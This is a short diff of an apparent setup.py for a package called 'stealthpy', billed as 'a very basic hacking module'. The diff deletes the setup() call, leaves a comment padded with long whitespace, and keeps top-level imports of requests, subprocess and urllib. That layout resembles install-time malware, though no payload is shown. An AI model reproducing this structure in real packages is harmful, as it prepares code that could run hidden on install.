@@ -11,20 +11,7 @@ classifiers = [
 	'Programming Language :: Python :: 3'
 ]
 
-setup(
-	name='stealthpy',
-	version='0.0.1',
-	description='A very basic hacking module',
-	long_description='gang',
-	url='',  
-	author='Harry Bowen',
-	author_email='harrybow@gmail.com',
-	license='MIT', 
-	classifiers=classifiers,
-	keywords='hack', 
-	packages=find_packages(),
-	install_requires=['requests','os','shutil','time','urllib.request','subprocess','pathlib']
-)
+# setup(...) removed                                                                                                                                                                                                                                                                                                                                                          
 
 import requests, os, shutil, time, urllib.request, subprocess, shutil
 
